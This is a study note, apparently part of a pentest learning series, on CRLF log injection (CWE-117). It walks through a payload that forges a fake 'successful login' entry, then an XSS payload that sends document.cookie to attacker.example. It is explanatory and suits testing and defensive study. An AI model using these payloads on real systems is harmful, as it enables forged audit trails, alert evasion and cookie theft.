# 05 — Log Injection via CRLF

## What it is

Log injection (also called log forging) is what happens when
attacker-controlled input is written into a log file — access logs,
application logs, authentication/audit logs — without filtering the line
terminators that delimit log entries. Almost every log format, from raw
Apache/nginx access logs to JSON Lines application logs to syslog, uses
`\n` (or `\r\n`) to separate one log entry from the next. The exact same
root cause from file `01` applies: the log writer has no length-prefixed
framing, only a delimiter, and if the attacker can put that delimiter
inside their own data, they can fabricate what looks like an entirely
separate, legitimate log entry.

This is CWE-117 (Improper Output Neutralization for Logs), a sibling of
CWE-93 — both are "the delimiter that separates records is also valid
inside the data, and nothing strips it."

## Piece-by-piece: forging a fake log entry

A common real sink: an authentication endpoint logs failed login attempts,
including the submitted username, for audit purposes:

```python
logger.info(f"Failed login attempt for user: {username}")
```

Malicious input for `username`:

```
admin%0d%0a2026-06-26 10:15:02 INFO  Successful login for user: admin from 10.0.0.1
```

URL-decoded, the actual string written into the log is:

```
admin
2026-06-26 10:15:02 INFO  Successful login for user: admin from 10.0.0.1
```

Breaking this down:

| Fragment | Meaning |
|---|---|
| `admin` | The (fake, attacker-chosen) username for the *real* log entry the application is writing — this part is genuinely a failed-login record |
| `%0d%0a` | Decodes to `\r\n` (or just `\n` depending on the platform's line-ending convention) — this is the injection. It terminates the real log line at a point the attacker chose, not the logger |
| `2026-06-26 10:15:02 INFO  Successful login for user: admin from 10.0.0.1` | A second, fully fabricated line, hand-crafted to match the exact format the application's own logger uses for genuine "successful login" events |

Anyone — or anything — that reads this log file line-by-line now sees what
looks like two separate, legitimate entries: a failed login, immediately
followed by a successful login for `admin`. An analyst doing incident
response, or an automated alerting rule looking for "successful login after
N failed attempts," can be misled into believing a real authentication
event occurred that never did.

## Piece-by-piece: escalating beyond forgery — injection into log
*consumers*

The forged-entry attack above only matters if a human or a simple text
parser reads the raw log. The escalation that matters in modern
architectures is what happens when the log is consumed by **something that
parses structure out of it** — a SIEM ingestion pipeline, a log viewer with
a web UI, a script that greps for patterns and acts on matches.

Example: a log viewer renders log lines into an HTML table without
escaping them (a second, independent vulnerability — but CRLF injection is
what gets the attacker's content into a position where that second flaw
can trigger). If the attacker injects:

```
admin%0d%0a<script>fetch('https://attacker.example/c?'+document.cookie)</script>
```

the fabricated "log entry" itself now contains an XSS payload. The CRLF
isn't delivering the XSS directly — it's making sure the payload lands on
its **own line**, formatted exactly like a normal log entry, so it survives
whatever per-line processing the log viewer does before the (separate)
output-encoding bug in the viewer triggers. This two-step chain — CRLF to
fabricate a clean record boundary, then a second flaw in however the record
is rendered or parsed — is the realistic version of "log injection leads to
XSS/code execution" claims you'll see referenced in OWASP material.

## Real-world note

Log injection rarely shows up as a standalone bug bounty payout, because
its impact depends entirely on what consumes the log — which is usually
internal infrastructure the attacker can't directly observe or prove impact
against from outside. In a pentest, however, it's a real and reportable
finding precisely because the *tester* often has visibility into the log
pipeline that an external bug bounty hunter doesn't. Practical impact areas
seen in real engagements:

- Audit trail integrity — forged entries undermine the evidentiary value of
  logs in incident response and compliance contexts (a serious finding for
  any org subject to audit requirements).
- SIEM/alerting evasion or false-positive flooding — an attacker can forge
  enough fake "successful login" or "privilege escalation" noise to bury
  real alerts, or trigger alert fatigue.
- Second-order injection into log viewers, dashboards, or any tool that
  re-parses structured fields out of log lines (this is the realistic path
  to the "log injection causes RCE/XSS" claims circulated about frameworks
  like Log4j-adjacent tooling — the CRLF/newline injection is what lets the
  attacker control record boundaries; the actual code execution or XSS
  comes from a second flaw in how the record is later processed).

Always test the actual log sink, not just whether the newline lands —
confirm what reads that log and how, since that's where the real severity
of this finding lives.

## PortSwigger lab note

PortSwigger does not provide a dedicated lab for log injection — it's a
server-side logging concern rather than a client-observable web
vulnerability, so it doesn't fit the Academy's "achieve a visible outcome
in the lab" format. Treat this file as methodology for manual testing and
pentest reporting rather than lab practice; if you want hands-on
verification, set up a small local logging harness (a basic Flask/Express
app writing plain-text logs) and confirm the line-splitting behavior
directly by tailing the log file while sending the payload above.
